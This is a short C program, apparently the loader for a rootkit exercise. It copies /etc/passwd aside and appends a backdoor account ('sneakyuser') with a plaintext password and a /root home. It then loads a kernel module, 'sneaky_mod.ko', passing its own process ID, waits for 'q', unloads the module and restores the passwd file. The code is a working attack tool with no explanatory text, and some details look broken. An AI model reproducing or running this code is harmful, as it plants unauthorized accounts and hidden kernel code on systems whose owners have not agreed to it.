#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>


int main(){
    // step 1
    printf("sneaky_process pid = %d\n", getpid());
    // step 2
    assert(system("cp /etc/passwd /tmp/")!=-1);
    assert(system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd")!=-1);
    
    // step 3
    char command[128];
    sprintf(command,"insmod sneaky_mod.ko process_id=%d",(int)getpid());
    assert(system(command)!=-1);
    // step 4
    char c;
    while(c = getchar()){
        if (c=='q'){
            break;
        }
    }
    // step 5
    assert(system("rmmod sneaky_mod")!=-1);
    // step 6
    assert(system("cp /tmp/passwd /etc")!=-1);
    assert(system("rm /tmp/passwd")!=-1);
}


